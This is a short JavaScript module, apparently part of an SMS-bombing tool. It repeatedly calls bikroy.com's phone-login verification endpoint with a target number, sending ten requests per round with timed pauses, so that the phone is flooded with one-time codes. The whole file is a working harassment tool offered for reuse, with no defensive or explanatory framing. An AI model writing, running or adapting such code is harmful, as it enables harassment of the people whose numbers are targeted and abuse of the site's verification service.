const axios = require("axios");

async function bikroy(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 10; i++) {
      try {
      const response = await axios.get(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${number}`);
        console.log(`[${i + 1}/10] bikroy Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] bikroy Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 5 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 300000));
    }
  }

  console.log("✅ All rounds completed.");
    }

module.exports = { bikroy };
